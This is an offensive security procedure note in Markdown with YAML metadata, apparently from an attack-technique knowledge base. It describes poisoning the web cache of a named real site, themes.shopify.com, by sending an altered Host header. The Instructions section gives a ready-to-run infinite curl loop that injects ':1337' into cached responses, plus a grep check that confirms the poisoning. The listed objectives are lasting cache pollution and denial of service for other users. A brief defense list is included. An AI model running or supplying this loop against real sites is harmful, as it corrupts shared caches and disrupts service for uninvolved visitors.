---
tags:
  - web-cache-poisoning
  - host-header
type: procedure
tools:
  - '[[tools/curl]]'
  - '[[tools/grep]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-poison-host-header]]'
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: f33047ce-af53-4b90-b009-1b6418016e74
created_at: '2025-12-14T17:26:55.921Z'
updated_at: '2025-12-14T17:26:55.921Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Poison-Web-Cache-with-Modified-Host-Header

## Summary

This procedure exploits a lack of Host header validation in the web cache to inject arbitrary port appendages, poisoning cache entries and influencing generated content like canonical links for future requests.

## Description

In the context of https://themes.shopify.com, the web cache fails to normalize or validate the Host header, allowing attackers to append ports like :1337. By sending repeated requests to a cacheable endpoint, the attacker poisons the cache, causing subsequent responses to include invalid URLs. This affects unauthenticated users and leverages default compression headers (e.g., gzip) in requests. Prerequisites include public access to the target and tools for custom HTTP requests.

## Requirements

1. Network access to https://themes.shopify.com on port 443
2. curl and grep installed on a Linux/Unix-like system
3. No authentication needed, but ability to send high-volume requests

## Defense

Defensive measures and detection strategies:

- Implement strict Host header validation and normalization in cache layers (e.g., Varnish, NGINX)
- Use cache keys that exclude or sanitize Host headers
- Monitor for anomalous Host headers in access logs and rate-limit suspicious requests

## Objectives

1. Inject poisoned Host into cache entries
2. Ensure cache pollution persists for subsequent users
3. Set up for DoS by invalidating resource paths

## Instructions

### Step 1: Prepare and Execute Poisoning Loop

**Context**: Launch a loop to repeatedly send requests with the modified Host header to hit and poison the cache.

**Command** ([[commands/curl-poison-host-header]]):
```bash
while true; do curl -ik "https://themes.shopify.com:443/?g4mm4=hitthecache" -H "Host: themes.shopify.com:1337" | grep ":1337"; sleep 0; echo 1; done
```

> This command overrides the Host header to include :1337, targets a cacheable parameter (?g4mm4=hitthecache), includes headers (-i) and insecure SSL (-k), pipes to grep for ':1337' confirmation, and loops indefinitely with minimal sleep. Expected output includes responses with poisoned elements like canonical links referencing port 1337.

### Step 2: Monitor Poisoning Success

**Context**: Observe the grep output during the loop to confirm cache entries are being poisoned.

**Command** (No new command; use output from Step 1):
```bash
grep ":1337"
```

> Filter shows successful injection when ':1337' appears in HTML elements. If no output, increase request volume or check for cache hit parameters.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-poison-host-header]]

## Tools Used

- [[tools/curl]]
- [[tools/grep]]

## Tags

- [[web-cache-poisoning]]
- [[host-header]]
